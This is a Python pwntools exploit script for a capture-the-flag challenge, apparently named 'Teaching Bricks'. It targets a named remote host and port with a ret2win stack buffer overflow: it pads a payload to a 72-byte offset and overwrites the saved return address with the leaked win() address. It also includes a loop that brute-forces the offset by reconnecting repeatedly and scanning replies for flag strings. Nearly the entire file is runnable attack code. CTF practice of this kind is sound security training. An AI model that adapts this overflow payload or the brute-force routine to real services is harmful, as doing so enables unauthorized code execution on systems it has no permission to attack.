#!/usr/bin/env python3
"""
MetaCTF - Teaching Bricks exploit script.

This script contains two workflows:
1. `exploit()` sends the known-good payload directly.
2. `bruteforce_offset()` can be used to rediscover the saved RIP offset.

The challenge is a classic ret2win:
- the service leaks the absolute address of win()
- a stack overflow lets us overwrite the saved return address
- the correct offset is 72 bytes on the remote target
"""

from __future__ import annotations

from pwn import context, p64, remote


HOST = "nc.umbccd.net"
PORT = 8921
WIN_ADDR = 0x4011A6
KNOWN_OFFSET = 72


def build_payload(offset: int = KNOWN_OFFSET, win_addr: int = WIN_ADDR) -> bytes:
    """Create the ret2win payload for the given offset and target address."""
    return b"A" * offset + p64(win_addr)


def exploit() -> bytes:
    """
    Send the final payload and return the server response.

    The service does not print anything on first connect, so we immediately
    send the payload rather than waiting for a banner.
    """
    io = remote(HOST, PORT, timeout=3)
    io.sendline(build_payload())
    data = io.recvrepeat(1.5)
    io.close()
    return data


def bruteforce_offset(start: int = 8, stop: int = 200) -> tuple[int | None, bytes]:
    """
    Rediscover the correct saved RIP offset by trying a range of candidates.

    Returns:
        (offset, response) if a flag-like response is found, otherwise (None, b"")
    """
    interesting = (b"flag", b"FLAG", b"CTF{", b"Meta", b"DawgCTF{", b"{")

    for offset in range(start, stop + 1):
        io = remote(HOST, PORT, timeout=3)
        io.sendline(build_payload(offset=offset))
        data = io.recvrepeat(1.0)
        io.close()

        line = data.decode("latin-1", errors="replace").strip()
        print(f"[{offset:03}] {line}")

        if any(token in data for token in interesting):
            return offset, data

    return None, b""


def main() -> None:
    context.log_level = "error"

    data = exploit()
    text = data.decode("latin-1", errors="replace").strip()
    print(text)


if __name__ == "__main__":
    main()
